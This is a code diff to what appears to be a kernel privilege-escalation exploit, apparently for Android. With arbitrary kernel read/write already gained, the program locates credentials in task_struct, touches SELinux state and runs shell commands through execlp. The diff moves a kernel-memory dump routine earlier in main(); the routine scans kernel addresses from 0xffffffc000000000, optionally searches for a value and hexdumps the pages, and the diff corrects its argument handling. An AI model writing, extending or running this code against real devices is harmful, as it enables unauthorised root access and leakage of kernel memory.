@@ -1200,6 +1200,54 @@ int main(int argc, char **argv)
 
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
+    
+    if (dump) {
+        unsigned long start, count;
+        start = 0xffffffc000000000ul;
+        count = 0x1000;
+        
+        if (argc >= 2) 
+            sscanf(argv[1], "%lx", &start);
+
+        start &= ~7;
+
+        if (argc >= 3)
+            sscanf(argv[2], "%lx", &count);
+        unsigned long search = 0;
+        
+        int emit = 0;
+        
+        if (argc >= 4)
+            sscanf(argv[3], "%lx", &search);
+        else
+            emit = 1;
+        
+        unsigned char page[PAGE];
+        for (unsigned long i=start; i<start+count ; i+=PAGE) {
+            kernel_read(i, page, PAGE);
+            if (!emit) {
+                for (int j=0; j<PAGE; j+=8) {
+                   if (*(unsigned long*)(page+j)==search) {
+                       emit = 1;
+                       break;
+                   }
+                }
+            }
+            if (emit) {
+                printf("%lx:\n", i);
+                unsigned long n = start+count-i;
+                if (n>=PAGE) {
+                    n = PAGE;
+                }
+                else {
+                    n = (n+15)/16*16;
+                }
+                hexdump_memory(page, n);
+            }
+        }
+        exit(0);
+    }
+
 
     message("MAIN: searching for cred offset in task_struct");
     unsigned char task_struct_data[PAGE+16];
@@ -1323,46 +1371,7 @@ int main(int argc, char **argv)
 //        for (int i=0; i<6; i++)
 //           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  
 
-    if (dump) {
-        unsigned long start, count;
-        start = 0xffffffc000000000ul;
-        count = 0x1000;
-        
-        if (argc >= 2) 
-            sscanf(argv[1], "%lx", &start);
-
-        start &= ~7;
-
-        if (argc >= 3)
-            sscanf(argv[3], "%lx", &count);
-        unsigned long startValue = 0;
-        
-        int emit = 0;
-        
-        if (argc >= 4)
-            sscanf(argv[4], "%lx", &startValue);
-        else
-            emit = 1;
-            
-        unsigned char page[PAGE];
-        for (unsigned long i=start; i<start+count ; i+=PAGE) {
-            kernel_read(i, page, PAGE);
-            if (!emit) {
-                for (int j=0; j<PAGE; j+=8) {
-                   if (*(unsigned long*)(page+j)==startValue) {
-                       emit = 1;
-                       break;
-                   }
-                }
-            }
-            if (emit) {
-                printf("%lx:\n", i);
-                hexdump_memory(page, PAGE);
-            }
-        }
-        exit(0);
-    }
-    else if (command || argc == 2) {
+    if (command || argc == 2) {
         execlp("sh", "sh", "-c", argv[1], (char *)0);
     }
     else {
